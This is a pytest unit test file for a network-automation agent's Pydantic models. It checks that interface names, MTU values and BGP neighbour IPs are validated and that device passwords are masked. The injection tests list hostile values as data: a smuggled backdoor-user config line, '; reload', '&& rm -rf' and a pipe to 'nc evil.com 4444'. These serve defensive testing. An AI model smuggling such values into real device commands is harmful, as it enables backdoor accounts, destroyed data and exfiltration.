"""Unit tests for models and Pydantic validation."""

import pytest
from pydantic import ValidationError

from networking_agent.models.device import DeviceInventory
from networking_agent.models.intent import NetworkIntent


def test_valid_network_intent():
    intent = NetworkIntent(
        diagnosis="BGP session down due to interface flapping.",
        severity="CRITICAL",
        requires_config_change=True,
        action="reset_bgp_neighbor",
        bgp_neighbor_ip="192.168.1.1",
    )
    assert intent.action == "reset_bgp_neighbor"
    assert intent.bgp_neighbor_ip == "192.168.1.1"


@pytest.mark.parametrize(
    "malicious_interface",
    [
        "Ethernet1/1\n username backdoor privilege 15 secret 0 evil",
        "GigabitEthernet0/0; reload",
        "ge-0/0/0 && rm -rf",
        "Ethernet1/1 | nc evil.com 4444",
        "Ethernet 1/1",
        "invalid_interface_syntax!",
    ],
)
def test_network_intent_rejects_command_injection(malicious_interface):
    with pytest.raises(ValidationError):
        NetworkIntent(
            diagnosis="Malicious log attempted",
            severity="HIGH",
            requires_config_change=True,
            action="disable_interface",
            target_interface=malicious_interface,
        )


@pytest.mark.parametrize("invalid_mtu", [10, 67, 9217, 65535, -1500])
def test_network_intent_rejects_invalid_mtu(invalid_mtu):
    with pytest.raises(ValidationError):
        NetworkIntent(
            diagnosis="Bad MTU attempted",
            severity="LOW",
            requires_config_change=True,
            action="set_interface_mtu",
            target_interface="Ethernet1/1",
            mtu_value=invalid_mtu,
        )


@pytest.mark.parametrize("invalid_ip", ["999.999.999.999", "not_an_ip", "10.0.0.1; rm", "10.0.0.1\n"])
def test_network_intent_rejects_invalid_bgp_ip(invalid_ip):
    with pytest.raises(ValidationError):
        NetworkIntent(
            diagnosis="Invalid BGP neighbor",
            severity="MEDIUM",
            requires_config_change=True,
            action="reset_bgp_neighbor",
            bgp_neighbor_ip=invalid_ip,
        )


def test_device_inventory_masks_password():
    dev = DeviceInventory(
        host="10.1.1.1",
        device_type="cisco_ios",
        username="admin",
        password="MySecretPassword123",  # type: ignore
    )
    # Ensure raw password string does not appear in __repr__
    assert "MySecretPassword123" not in repr(dev)
    # But netmiko dictionary gets the actual value
    net_dict = dev.to_netmiko_dict()
    assert net_dict["password"] == "MySecretPassword123"
